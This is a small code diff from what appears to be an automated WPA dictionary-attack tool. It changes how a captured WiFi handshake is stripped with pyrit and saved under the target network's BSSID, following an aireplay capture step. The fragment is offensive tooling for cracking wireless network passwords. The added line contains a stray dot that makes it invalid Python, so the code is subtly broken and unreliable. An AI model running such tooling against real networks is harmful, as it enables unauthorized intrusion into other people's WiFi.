@@ -34,7 +34,9 @@ class wpa_dictionary(BaseAttack):
 		cmd_aireplay.close()
 		time.sleep(settings.WPA_EXPECT_HANDSHAKE_TIME)
 
-		cmd_pyrit = pexpect.spawn('pyrit -r cr0z0n0_attack-01.cap analyze')
+		pexpect.run('pyrit -r cr0z0n0_attack-01.cap -o ' + . settings.TARGET_BSSID + '.cap stripLive');
+
+		cmd_pyrit = pexpect.spawn('pyrit -r ' + settings.TARGET_BSSID + '.cap analyze')
 		cmd_pyrit.logfile = open(settings.LOG_FILE, 'wb')
 		cmd_pyrit.expect(['No valid', 'good', pexpect.TIMEOUT, pexpect.EOF])
 		cmd_pyrit.close()
